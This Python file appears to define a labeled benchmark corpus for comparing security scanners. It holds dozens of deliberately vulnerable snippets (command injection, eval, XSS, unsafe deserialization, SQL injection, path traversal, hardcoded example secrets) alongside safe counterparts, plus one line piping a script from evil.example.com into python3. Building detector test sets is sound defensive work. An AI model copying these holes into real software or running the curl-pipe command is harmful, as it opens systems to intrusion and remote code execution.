"""Labeled detection corpus.

Slices (headline metrics never mix these):
  shared   — classes security-guidance actually ships patterns for. Complete
             mini-files so Semgrep's parser has a chance. Three-way comparison.
  sast     — classes Semgrep public rules cover that SG does not (SQLi, JWT,
             secrets, SSTI, path). Peephole vs Semgrep only.
  sg_turf  — GitHub Actions injection and SRI; SG's documented home turf.
  breadth  — extra languages/classes peephole claims. Coverage, not a bake-off.
  benign   — everyday correct code. An engine that flags one gets an FP.
  semantic — absence-of-guard; no regex can prove. Reported separately.

Cases are short but complete compilation units, not 1-line regex bait.
"""
from collections import namedtuple

Case = namedtuple("Case", "path content category vulnerable slice")
CASES = []


def V(path, content, category, slice="shared"):
    CASES.append(Case(path, content.strip("\n") + "\n", category, True, slice))


def B(path, content, category):
    CASES.append(Case(path, content.strip("\n") + "\n", category, False, "benign"))


def S(path, content, category):
    CASES.append(Case(path, content.strip("\n") + "\n", category, True, "semantic"))


# ---------------------------------------------------------------------------
# SHARED: SG ships a pattern for the class. Realistic files.
# ---------------------------------------------------------------------------

V("app/cmd_os.py", '''
from flask import Flask, request
import os

app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    os.system(f"ping -c 1 {host}")
    return "ok"
''', "cmdi")

V("app/cmd_sub.py", '''
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    subprocess.run(f"ping -c 1 {host}", shell=True)
    return "ok"
''', "cmdi")

V("app/cmd_exec.js", '''
const { exec } = require("child_process");

function ping(host) {
  exec("ping -c 1 " + host, (err, stdout) => {
    console.log(stdout);
  });
}

module.exports = { ping };
''', "cmdi")

V("app/cmd_go.go", '''
package main

import "os/exec"

func ping(host string) error {
    cmd := exec.Command("sh", "-c", "ping -c 1 "+host)
    return cmd.Run()
}
''', "cmdi")

V("app/eval_py.py", '''
from flask import Flask, request

app = Flask(__name__)

@app.route("/calc")
def calc():
    expr = request.args.get("expr", "0")
    return str(eval(expr))
''', "eval")

V("app/eval_fn.js", '''
function run(userInput) {
  return new Function("return " + userInput)();
}

module.exports = { run };
''', "eval")

V("app/xss_inner.js", '''
function addComment(comment) {
  const el = document.getElementById("board");
  el.innerHTML = comment;
}

module.exports = { addComment };
''', "xss")

V("app/xss_outer.js", '''
function replaceCard(html) {
  document.getElementById("card").outerHTML = html;
}

module.exports = { replaceCard };
''', "xss")

V("app/xss_insert.js", '''
function appendNote(html) {
  document.getElementById("notes").insertAdjacentHTML("beforeend", html);
}

module.exports = { appendNote };
''', "xss")

V("app/xss_react.jsx", '''
export function Comment({ body }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}
''', "xss")

V("app/xss_write.js", '''
function paint(name) {
  document.write("<h1>" + name + "</h1>");
}

module.exports = { paint };
''', "xss")

V("app/deser_pickle.py", '''
import pickle
from flask import Flask, request

app = Flask(__name__)

@app.route("/load", methods=["POST"])
def load():
    return str(pickle.loads(request.data))
''', "deser")

V("app/deser_yaml.py", '''
import yaml

def load_cfg(path):
    with open(path) as f:
        return yaml.load(f, Loader=yaml.Loader)
''', "deser")

V("app/deser_torch.py", '''
import torch

def load_model(path):
    return torch.load(path)
''', "deser")

V("app/deser_shelve.py", '''
import shelve

def open_cache(path):
    return shelve.open(path)
''', "deser")

V("app/deser_joblib.py", '''
import joblib

def load_model(path):
    return joblib.load(path)
''', "deser")

V("app/crypto_ecb.py", '''
from Crypto.Cipher import AES

def encrypt(key, data):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(data)
''', "crypto")

V("app/crypto_cipher.js", '''
const crypto = require("crypto");

function enc(key, data) {
  const c = crypto.createCipher("aes-256-ecb", key);
  return c.update(data, "utf8", "hex") + c.final("hex");
}

module.exports = { enc };
''', "crypto")

V("app/tls_skip.py", '''
import requests

def fetch(url):
    return requests.get(url, verify=False)
''', "misconfig")

V("app/tls_go.go", '''
package main

import "crypto/tls"

func insecure() *tls.Config {
    return &tls.Config{InsecureSkipVerify: true}
}
''', "misconfig")

V("app/xml_et.py", '''
import xml.etree.ElementTree as ET

def parse_user_xml(path):
    return ET.parse(path)
''', "xxe")

V("app/cmd_execsync.js", '''
const { execSync } = require("child_process");

function ping(host) {
  return execSync("ping -c 1 " + host).toString();
}

module.exports = { ping };
''', "cmdi")

V("app/cmd_popen.py", '''
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    subprocess.Popen(f"ping -c 1 {host}", shell=True)
    return "ok"
''', "cmdi")

V("app/deser_marshal.py", '''
import marshal
from flask import Flask, request

app = Flask(__name__)

@app.route("/load", methods=["POST"])
def load():
    return str(marshal.loads(request.data))
''', "deser")

V("app/deser_cloudpickle.py", '''
import cloudpickle
from flask import Flask, request

app = Flask(__name__)

@app.route("/load", methods=["POST"])
def load():
    return cloudpickle.loads(request.data)
''', "deser")

V("app/deser_numpy.py", '''
import numpy as np

def load_arr(path):
    return np.load(path, allow_pickle=True)
''', "deser")

V("app/deser_pandas.py", '''
import pandas as pd

def load_frame(path):
    return pd.read_pickle(path)
''', "deser")

V("app/deser_yaml_unsafe.py", '''
import yaml

def load_cfg(path):
    with open(path) as f:
        return yaml.unsafe_load(f)
''', "deser")

V("app/xss_inner_concat.js", '''
function render(userHtml) {
  const el = document.getElementById("main");
  el.innerHTML = "<div>" + userHtml + "</div>";
}

module.exports = { render };
''', "xss")

V("app/tls_node.js", '''
const https = require("https");

function get(url) {
  return https.get(url, { rejectUnauthorized: false });
}

module.exports = { get };
''', "misconfig")

V("app/xml_minidom.py", '''
from xml.dom import minidom

def parse_blob(xml):
    return minidom.parseString(xml)
''', "xxe")

V("app/cmd_ospopen.py", '''
from flask import Flask, request
import os

app = Flask(__name__)

@app.route("/cat")
def cat():
    path = request.args.get("path", "")
    os.popen("cat " + path)
    return "ok"
''', "cmdi")

V("app/cmd_asyncio.py", '''
import asyncio
from flask import Flask, request

app = Flask(__name__)

@app.route("/ping")
async def ping():
    host = request.args.get("host", "")
    await asyncio.create_subprocess_shell(f"ping -c 1 {host}")
    return "ok"
''', "cmdi")

V("app/cmd_spawn.js", '''
const { spawn } = require("child_process");

function ping(host) {
  return spawn("ping -c 1 " + host, { shell: true });
}

module.exports = { ping };
''', "cmdi")

V("app/eval_exec.py", '''
from flask import Flask, request

app = Flask(__name__)

@app.route("/run")
def run():
    code = request.args.get("code", "")
    exec(code)
    return "ok"
''', "eval")

V("app/eval_timeout.js", '''
function later(userCode) {
  setTimeout("void " + userCode, 0);
}

module.exports = { later };
''', "eval")

V("app/eval_vm.js", '''
const vm = require("vm");

function run(userCode) {
  return vm.runInNewContext(userCode);
}

module.exports = { run };
''', "eval")

V("app/deser_jsonpickle.py", '''
import jsonpickle
from flask import Flask, request

app = Flask(__name__)

@app.route("/load", methods=["POST"])
def load():
    return jsonpickle.loads(request.data)
''', "deser")

V("app/deser_dill.py", '''
import dill
from flask import Flask, request

app = Flask(__name__)

@app.route("/load", methods=["POST"])
def load():
    return dill.loads(request.data)
''', "deser")

V("app/deser_pickle_file.py", '''
import pickle
from flask import Flask, request

app = Flask(__name__)

@app.route("/load", methods=["POST"])
def load():
    return pickle.load(request.stream)
''', "deser")

V("app/crypto_decipher.js", '''
const crypto = require("crypto");

function dec(key, data) {
  const d = crypto.createDecipher("aes-256-ecb", key);
  return d.update(data, "hex", "utf8") + d.final("utf8");
}

module.exports = { dec };
''', "crypto")

V("app/tls_env.js", '''
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const https = require("https");
module.exports = { https };
''', "misconfig")

V("app/xml_fromstring.py", '''
import xml.etree.ElementTree as ET
from flask import Flask, request

app = Flask(__name__)

@app.route("/parse", methods=["POST"])
def parse():
    return ET.fromstring(request.data).tag
''', "xxe")

V("app/xss_template.js", '''
function paint(name) {
  document.getElementById("h").innerHTML = `<h1>${name}</h1>`;
}

module.exports = { paint };
''', "xss")

V("app/xss_jquery.js", '''
function setBody(userHtml) {
  $("#main").html("<div>" + userHtml + "</div>");
}

module.exports = { setBody };
''', "xss")

# ---------------------------------------------------------------------------
# SAST: Semgrep public rules cover these; SG has no pattern. Not a 3-way.
# ---------------------------------------------------------------------------

V("app/sql_flask.py", '''
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/user")
def user():
    uid = request.args.get("id")
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    cur.execute(f"SELECT * FROM users WHERE id={uid}")
    row = cur.fetchone()
    conn.close()
    return str(row)
''', "sqli", "sast")

V("app/sql_percent.py", '''
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/user")
def user():
    name = request.args.get("name")
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE name='%s'" % name)
    return str(cur.fetchone())
''', "sqli", "sast")

V("app/sql_js.js", '''
function findUser(db, id) {
  return db.query("SELECT * FROM users WHERE id=" + id);
}

module.exports = { findUser };
''', "sqli", "sast")

V("app/sql_go.go", '''
package main

import (
    "database/sql"
    "fmt"
)

func lookup(db *sql.DB, id string) (*sql.Rows, error) {
    return db.Query(fmt.Sprintf("SELECT * FROM t WHERE id=%s", id))
}
''', "sqli", "sast")

V("app/jwt_py.py", '''
import jwt
from flask import Flask, request

app = Flask(__name__)

@app.route("/me")
def me():
    token = request.headers.get("Authorization", "").split(" ", 1)[-1]
    return jwt.decode(token, options={"verify_signature": False})
''', "jwt", "sast")

V("app/jwt_go.go", '''
package main

import "github.com/golang-jwt/jwt/v5"

func parse(token string) jwt.MapClaims {
    claims := jwt.MapClaims{}
    jwt.NewParser().ParseUnverified(token, claims)
    return claims
}
''', "jwt", "sast")

V("app/sec_aws.py", '''
import boto3

AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

def client():
    return boto3.client(
        "s3",
        aws_access_key_id=AWS_ACCESS_KEY_ID,
        aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
    )
''', "secrets", "sast")

V("app/sec_github.py", '''
import os
import requests

GITHUB_TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"

def orgs():
    return requests.get(
        "https://api.github.com/user/orgs",
        headers={"Authorization": "Bearer " + GITHUB_TOKEN},
    )
''', "secrets", "sast")

V("app/ssti_concat.py", '''
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    return render_template_string("<h1>Hello " + name + "</h1>")
''', "ssti", "sast")

V("app/ssti_fstring.py", '''
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "World")
    template = f"Hello, {name}!"
    return render_template_string(template)
''', "ssti", "sast")

V("app/path_open.py", '''
from flask import Flask, request

app = Flask(__name__)

@app.route("/dl")
def dl():
    name = request.args.get("n")
    return open("/var/data/" + name).read()
''', "pathtrav", "sast")

V("app/path_join.py", '''
from flask import Flask, request
import os

app = Flask(__name__)

@app.route("/dl")
def dl():
    name = request.args.get("name")
    return open(os.path.join("./files", name), "rb").read()
''', "pathtrav", "sast")

V("app/crypto_md5.py", '''
import hashlib

def register(username, password):
    users = {}
    users[username] = hashlib.md5(password.encode()).hexdigest()
    return users
''', "crypto", "sast")

V("app/sql_format.py", '''
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/user")
def user():
    uid = request.args.get("id")
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE id={}".format(uid))
    return str(cur.fetchone())
''', "sqli", "sast")

V("app/sql_js_tpl.js", '''
function findUser(db, id) {
  return db.query(`SELECT * FROM users WHERE id=${id}`);
}

module.exports = { findUser };
''', "sqli", "sast")

V("app/jwt_node.js", '''
const jwt = require("jsonwebtoken");

function claims(token) {
  return jwt.decode(token, { complete: false });
}

module.exports = { claims };
''', "jwt", "sast")

V("app/sec_stripe.js", '''
const stripe = require("stripe")("sk_live_4eC39HqLyjWDarjtT1zdp7dc");

function charge(amount) {
  return stripe.charges.create({ amount, currency: "usd" });
}

module.exports = { charge };
''', "secrets", "sast")

V("app/ssti_from_string.py", '''
from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)
env = Environment()

@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    return env.from_string("Hi " + name).render()
''', "ssti", "sast")

V("app/path_send.py", '''
from flask import Flask, request, send_file

app = Flask(__name__)

@app.route("/dl")
def dl():
    name = request.args.get("name")
    return send_file("/var/data/" + name)
''', "pathtrav", "sast")

V("app/jwt_none.py", '''
import jwt
from flask import Flask, request

app = Flask(__name__)

@app.route("/me")
def me():
    token = request.headers.get("Authorization", "").split(" ", 1)[-1]
    return jwt.decode(token, options={"verify_signature": False}, algorithms=["none"])
''', "jwt", "sast")

V("app/path_js.js", '''
const fs = require("fs");

function readUserFile(req) {
  const name = req.query.name;
  return fs.readFileSync("./files/" + name);
}

module.exports = { readUserFile };
''', "pathtrav", "sast")

V("app/sql_sa.py", '''
from flask import Flask, request
from sqlalchemy import create_engine, text

app = Flask(__name__)
engine = create_engine("sqlite:///app.db")

@app.route("/user")
def user():
    uid = request.args.get("id")
    with engine.connect() as conn:
        return str(conn.execute(text(f"SELECT * FROM users WHERE id={uid}")).fetchone())
''', "sqli", "sast")

V("app/sql_django.py", '''
from django.contrib.auth.models import User

def search(name):
    return User.objects.extra(where=["name = '%s'" % name])
''', "sqli", "sast")

V("app/sec_slack.py", '''
import requests

SLACK_BOT_TOKEN = "xoxb-1234567890-abcdefghijkl"

def notify(text):
    return requests.post(
        "https://slack.com/api/chat.postMessage",
        headers={"Authorization": "Bearer " + SLACK_BOT_TOKEN},
        json={"text": text},
    )
''', "secrets", "sast")

V("app/sec_pem.py", '''
PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF1P
-----END RSA PRIVATE KEY-----"""

def signer():
    return PRIVATE_KEY
''', "secrets", "sast")

V("app/ssti_markup.py", '''
from flask import Flask, request, Markup

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    return Markup("<h1>Hello " + name + "</h1>")
''', "ssti", "sast")

V("app/sql_insert.py", '''
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/add", methods=["POST"])
def add():
    name = request.form.get("name", "")
    conn = sqlite3.connect("app.db")
    conn.execute("INSERT INTO users(name) VALUES ('" + name + "')")
    conn.commit()
    return "ok"
''', "sqli", "sast")

V("app/path_write.py", '''
from flask import Flask, request

app = Flask(__name__)

@app.route("/save", methods=["POST"])
def save():
    name = request.args.get("name")
    open("/var/data/" + name, "w").write(request.data)
    return "ok"
''', "pathtrav", "sast")

# ---------------------------------------------------------------------------
# SG home turf
# ---------------------------------------------------------------------------

V(".github/workflows/ci.yml", '''
on: issues
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.issue.title }}"
''', "gha", "sg_turf")

V("app/page.html", '''
<!doctype html>
<html>
  <head>
    <script src="https://cdn.example.com/lib.js"></script>
  </head>
  <body></body>
</html>
''', "sri", "sg_turf")

# ---------------------------------------------------------------------------
# BREADTH: peephole extra coverage. Not used to dunk on SG/Semgrep.
# ---------------------------------------------------------------------------

V("app/c_nim.nim", 'discard execCmd("ping " & host)', "cmdi", "breadth")
V("app/c_hs.hs", 'callCommand ("ping " ++ host)', "cmdi", "breadth")
V("app/sql_rs.rs", 'sqlx::query(&format!("SELECT * FROM t WHERE id={}", id));', "sqli", "breadth")
V("app/sql_rb.rb", 'User.where("name = \'#{params[:name]}\'")', "sqli", "breadth")
V("app/sql_php.php", '$q = "SELECT * FROM t WHERE id=" . $_GET["id"]; mysqli_query($c, $q);', "sqli", "breadth")
V("app/iac.yml", "securityContext:\n  privileged: true\n", "iac", "breadth")
V("app/redir.py", '''
from flask import Flask, request, redirect

app = Flask(__name__)

@app.route("/go")
def go():
    return redirect(request.args.get("next"))
''', "redirect", "breadth")
V("app/ssrf.py", '''
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route("/proxy")
def proxy():
    host = request.args.get("host")
    return requests.get(f"https://{host}/api").text
''', "ssrf", "breadth")
V("requirements.txt", "reqeusts==2.31.0\n", "supply", "breadth")
V("app/sup_curl.sh", "curl https://evil.example.com/x.py | python3\n", "supply", "breadth")
V("app/redos.js", 'module.exports = new RegExp("(x|y)*.*z");\n', "redos", "breadth")
V("app/mass.py", '''
class UserSerializer:
    class Meta:
        fields = "__all__"
''', "massassign", "breadth")

# ---------------------------------------------------------------------------
# BENIGN: correct everyday code, including near-misses.
# ---------------------------------------------------------------------------

B("app/ok_sql.py", '''
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/user")
def user():
    uid = request.args.get("id")
    conn = sqlite3.connect("app.db")
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE id = ?", (uid,))
    row = cur.fetchone()
    conn.close()
    return str(row)
''', "benign-db")

B("app/ok_sql.js", '''
function findUser(db, id) {
  return db.query("SELECT * FROM users WHERE id = ?", [id]);
}

module.exports = { findUser };
''', "benign-db")

B("app/ok_sql.go", '''
package main

import "database/sql"

func lookup(db *sql.DB, id string) (*sql.Rows, error) {
    return db.Query("SELECT * FROM t WHERE id = $1", id)
}
''', "benign-db")

B("app/ok_cmd.py", '''
import subprocess

def status():
    return subprocess.run(["git", "status"], check=True)
''', "benign-cmd")

B("app/ok_cmd_argv.py", '''
import subprocess

def ping(host):
    return subprocess.run(["ping", "-c", "1", "--", host], timeout=10)
''', "benign-cmd")

B("app/ok_cmd.go", '''
package main

import "os/exec"

func ping(host string) error {
    return exec.Command("ping", "-c", "1", host).Run()
}
''', "benign-cmd")

B("app/ok_execfile.js", '''
const { execFile } = require("child_process");

function ping(host) {
  execFile("ping", ["-c", "1", host], () => {});
}

module.exports = { ping };
''', "benign-cmd")

B("app/ok_sha256.py", '''
import hashlib

def digest(file_bytes):
    return hashlib.sha256(file_bytes).hexdigest()
''', "benign-crypto")

B("app/ok_secrets.py", '''
import os
from flask import Flask

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
DB_PASSWORD = os.environ["DB_PASSWORD"]
''', "benign-secrets")

B("app/ok_placeholder.py", '''
API_KEY = "<your-api-key-here>"
''', "benign-secrets")

B("app/ok_yaml.py", '''
import yaml

def load_cfg(path):
    with open(path) as f:
        return yaml.safe_load(f)
''', "benign-deser")

B("app/ok_yaml_loader.py", '''
import yaml

def load_cfg(path):
    with open(path) as f:
        return yaml.load(f, Loader=yaml.SafeLoader)
''', "benign-deser")

B("app/ok_torch.py", '''
import torch

def load_model(path):
    return torch.load(path, weights_only=True)
''', "benign-deser")

B("app/ok_pickle_dump.py", '''
import pickle

def save(obj, path):
    with open(path, "wb") as f:
        pickle.dump(obj, f)
''', "benign-deser")

B("app/ok_xss.js", '''
function addComment(comment) {
  const el = document.getElementById("board");
  el.textContent = comment;
}

module.exports = { addComment };
''', "benign-xss")

B("app/ok_dompurify.js", '''
function addComment(userHtml) {
  const el = document.getElementById("board");
  el.innerHTML = DOMPurify.sanitize(userHtml);
}

module.exports = { addComment };
''', "benign-xss")

B("app/ok_ssti.py", '''
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/greet")
def greet():
    TEMPLATE = "<h1>Hello, {{ name }}!</h1>"
    return render_template_string(TEMPLATE, name=request.args.get("name", "World"))
''', "benign-xss")

B("app/ok_template.py", '''
from flask import Flask, render_template

app = Flask(__name__)

@app.route("/profile")
def profile():
    return render_template("profile.html", user="alice")
''', "benign-xss")

B("app/ok_literal.py", '''
import ast

def parse(expr):
    return ast.literal_eval(expr)
''', "benign-eval")

B("app/ok_torch_eval.py", '''
def freeze(model):
    model.eval()
    return model
''', "benign-eval")

B("app/ok_static_eval.py", '''
def demo():
    return eval("1 + 2")
''', "benign-eval")

B("app/ok_static_system.py", '''
import os

def list_cwd():
    os.system("ls -la")
''', "benign-cmd")

B("app/ok_path.py", '''
import os

STATIC = os.path.join(os.path.dirname(__file__), "static", "app.css")
''', "benign-path")

B("app/ok_send.py", '''
from flask import Flask, send_from_directory

app = Flask(__name__)

@app.route("/files/<name>")
def files(name):
    return send_from_directory("uploads", name)
''', "benign-path")

B("app/ok_net.py", '''
import requests

def github_user():
    return requests.get("https://api.github.com/user", timeout=5)
''', "benign-net")

B("app/ok_chmod.py", '''
import os

def lock(path):
    os.chmod(path, 0o600)
''', "benign-perms")

B("app/ok_log.py", '''
import logging

def login(username):
    logging.info("user %s logged in", username)
''', "benign-log")

B("app/ok_xml.py", '''
import defusedxml.ElementTree as ET

def parse(path):
    return ET.parse(path)
''', "benign-xxe")

B("app/ok_sri.html", '''
<script src="https://cdn.example.com/lib.js" integrity="sha384-abc" crossorigin="anonymous"></script>
''', "benign-sri")

B("app/ok_jwt.py", '''
import jwt

def decode(token, key):
    return jwt.decode(token, key, algorithms=["HS256"])
''', "benign-jwt")

B("app/ok_gha.yml", '''
steps:
  - run: echo "$TITLE"
    env:
      TITLE: ${{ github.event.issue.title }}
''', "benign-gha")

B("app/ok_hmac.py", '''
import hmac

def same(a, b):
    return hmac.compare_digest(a, b)
''', "benign-jwt")

B("app/ok_rand.py", '''
import secrets

def token():
    return secrets.token_urlsafe(32)
''', "benign-crypto")

B("app/ok_md5_file.py", '''
import hashlib

def file_id(data):
    return hashlib.md5(data).hexdigest()
''', "benign-crypto")

B("app/ok_regex_exec.js", '''
function hostFrom(line) {
  const m = /host=([\\w.-]+)/.exec(line);
  return m ? m[1] : "";
}

module.exports = { hostFrom };
''', "benign-cmd")

B("app/ok_jwt_parse.go", '''
package main

import "github.com/golang-jwt/jwt/v5"

func parse(token string, secret []byte) (*jwt.Token, error) {
    return jwt.Parse(token, func(t *jwt.Token) (interface{}, error) {
        return secret, nil
    })
}
''', "benign-jwt")

B("app/ok_spawn.js", '''
const { spawn } = require("child_process");

function ping(host) {
  return spawn("ping", ["-c", "1", "--", host], { shell: false });
}

module.exports = { ping };
''', "benign-cmd")

B("app/ok_asyncio.py", '''
import asyncio

async def ping(host):
    proc = await asyncio.create_subprocess_exec("ping", "-c", "1", host)
    await proc.wait()
''', "benign-cmd")

B("app/ok_vm.js", '''
const vm = require("vm");

function run() {
  return vm.runInNewContext("1 + 2");
}

module.exports = { run };
''', "benign-eval")

B("app/ok_sql_sa.py", '''
from sqlalchemy import create_engine, text

engine = create_engine("sqlite:///app.db")

def lookup(uid):
    with engine.connect() as conn:
        return conn.execute(text("SELECT * FROM users WHERE id = :id"), {"id": uid}).fetchone()
''', "benign-db")

# ---------------------------------------------------------------------------
# SEMANTIC: no pattern layer can prove these. Not in TP recall.
# ---------------------------------------------------------------------------

S("app/sem_race.py", '''
def withdraw(uid, amount):
    bal = get_balance(uid)
    if bal >= amount:
        set_balance(uid, bal - amount)
''', "semantic-race")

S("app/sem_price.py", '''
from flask import Flask, request

app = Flask(__name__)

@app.route("/order", methods=["POST"])
def order():
    qty = int(request.form["qty"])
    price = float(request.form["price"])
    charge(user, qty * price)
    return "ok"
''', "semantic-bizlogic")
